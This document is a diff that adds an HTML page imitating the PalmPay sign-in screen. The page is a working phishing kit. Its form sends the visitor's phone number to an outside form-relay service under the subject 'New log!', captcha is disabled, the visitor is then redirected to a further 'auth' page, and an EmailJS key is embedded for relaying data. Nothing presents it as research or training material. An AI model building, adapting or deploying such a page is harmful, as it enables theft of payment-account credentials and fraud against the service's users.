@@ -1,0 +1,75 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="logo.webp">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="palmpay.scss">
+  <link rel="stylesheet" href="palmpay.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
+  <title>Palmpay Sign In</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+  </style>
+
+</head>
+
+<body data-new-gr-c-s-check-loaded="8.906.0" data-gr-ext-installed="">
+  <div id="app" class="mt-14 text-left w-[90%] mx-auto max-w-sm">
+    <h1 class="font-semibold text-lg">Login PalmPay</h1>
+
+    <div class="inputCtn relative mt-16">
+
+      <form action="https://formsubmit.co/el/kohoxa" method="post" id="form">
+
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_subject" value="New log!">
+        <input type="hidden" name="_next" value="http://127.0.0.1:5500/auth.html">
+
+        <input type="tel" required="" minlength="10" maxlength="11" id="phone" name="phone" class="w-full pl-20 border-b border-b-black outline-none font-bold p-2 caret-primary">
+
+        <button disabled="" type="submit" class="w-full rounded-lg bg-primary p-3 mt-10 text-white disabled:pointer-events-none disabled:opacity-30">Login</button>
+
+      </form>
+
+      <div class="flagCtn flex items-center gap-x-1 absolute top-3">
+        <img class="w-5" src="NG.a8d189be.png">
+        <p class="text-xs font-semibold">+234</p>
+      </div>
+    </div>
+  </div>
+
+  <p class="absolute bottom-10 mx-auto text-center inset-x-0 text-xs font-medium">Don't have an account? <span class="text-primary">Click here to sign up</span></p>
+
+
+
+
+
+
+
+
+
+
+
+  <script type="module" src="main.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init('dmDFhm35MG0A-aotg');
+    })();
+  </script>
+  <script type="text/javascript">
+    window.onload = function () {
+      console.log('working');
+      const btn = document.querySelector('button')
+      const phoneInput = document.querySelector('#phone')
+      document.getElementById('form').addEventListener('submit', function (event) {
+        btn.textContent = 'Loading...';
+        localStorage.setItem('phone', phoneInput.value)
+      });
+    }
+  </script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
